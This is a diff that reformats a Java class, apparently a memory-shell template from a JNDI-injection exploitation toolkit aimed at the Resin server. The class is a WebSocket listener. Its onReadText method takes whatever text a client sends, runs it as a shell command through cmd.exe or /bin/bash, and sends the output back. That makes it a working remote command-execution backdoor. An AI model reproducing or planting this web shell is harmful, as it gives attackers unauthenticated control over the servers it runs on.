@@ -1,6 +1,5 @@
 package com.qi4l.jndi.template.memshell.resin;
 
-import com.caucho.server.webapp.WebApp;
 import com.caucho.websocket.WebSocketContext;
 import com.caucho.websocket.WebSocketListener;
 import com.caucho.websocket.WebSocketServletRequest;
@@ -14,12 +13,12 @@ public class WsResin implements WebSocketListener {
 
     static {
         try {
-            ClassLoader classloader = Thread.currentThread().getContextClassLoader();
-            Class servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
-            Object contextRequest = servletInvocationcls.getMethod("getContextRequest").invoke(null);
-            String protocol         = (String) contextRequest.getClass().getMethod("getHeader").invoke(contextRequest,"Upgrade");
+            ClassLoader classloader          = Thread.currentThread().getContextClassLoader();
+            Class       servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
+            Object      contextRequest       = servletInvocationcls.getMethod("getContextRequest").invoke(null);
+            String      protocol             = (String) contextRequest.getClass().getMethod("getHeader").invoke(contextRequest, "Upgrade");
             //String protocol       = request.getHeader("Upgrade");
-            if (! "websocket".equals(protocol)) {
+            if (!"websocket".equals(protocol)) {
                 System.out.println("not websocket");
                 System.exit(0);
             }
@@ -29,10 +28,11 @@ public class WsResin implements WebSocketListener {
         } catch (Exception ignored) {
         }
     }
+
     @Override
     public void onReadText(WebSocketContext context, Reader is) throws IOException {
         StringBuilder sb = new StringBuilder();
-        int ch;
+        int           ch;
         while ((ch = is.read()) >= 0) {
             sb.append((char) ch);
         }
@@ -40,15 +40,15 @@ public class WsResin implements WebSocketListener {
             Process process;
             boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
             if (bool) {
-                process = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", sb.toString() });
+                process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", sb.toString()});
             } else {
-                process = Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", sb.toString() });
+                process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", sb.toString()});
             }
-            InputStream inputStream = process.getInputStream();
+            InputStream   inputStream   = process.getInputStream();
             StringBuilder stringBuilder = new StringBuilder();
-            int i;
+            int           i;
             while ((i = inputStream.read()) != -1)
-                stringBuilder.append((char)i);
+                stringBuilder.append((char) i);
             inputStream.close();
             process.waitFor();
             PrintWriter writer = context.startTextMessage();
@@ -57,22 +57,27 @@ public class WsResin implements WebSocketListener {
         } catch (Exception ignored) {
         }
     }
+
     @Override
     public void onClose(WebSocketContext webSocketContext) throws IOException {
 
     }
+
     @Override
     public void onDisconnect(WebSocketContext webSocketContext) throws IOException {
 
     }
+
     @Override
     public void onTimeout(WebSocketContext webSocketContext) throws IOException {
 
     }
+
     @Override
     public void onStart(WebSocketContext webSocketContext) throws IOException {
 
     }
+
     @Override
     public void onReadBinary(WebSocketContext webSocketContext, InputStream inputStream) throws IOException {
 
